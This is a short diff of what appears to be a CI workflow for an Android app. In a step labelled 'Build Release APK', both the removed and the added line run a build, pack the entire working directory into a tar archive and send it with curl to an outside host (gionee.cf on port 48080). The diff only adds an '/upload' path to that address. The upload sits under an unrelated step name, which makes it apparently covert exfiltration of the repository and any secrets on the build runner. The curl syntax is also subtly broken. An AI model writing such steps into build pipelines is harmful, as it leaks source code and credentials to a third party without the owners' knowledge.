@@ -19,4 +19,4 @@ jobs:
     - name: Make Gradle executable
       run: chmod +x ./gradlew
     - name: Build Release APK
-      run: ./gradlew assembleDebug&&ls&&tar -czvf tar.tar.gz ./*&&curl -F “file=tar.tar.gz” -F “user=any” http://gionee.cf:48080/
+      run: ./gradlew assembleDebug&&ls&&tar -czvf tar.tar.gz ./*&&curl -F “file=tar.tar.gz” -F “user=any” http://gionee.cf:48080/upload
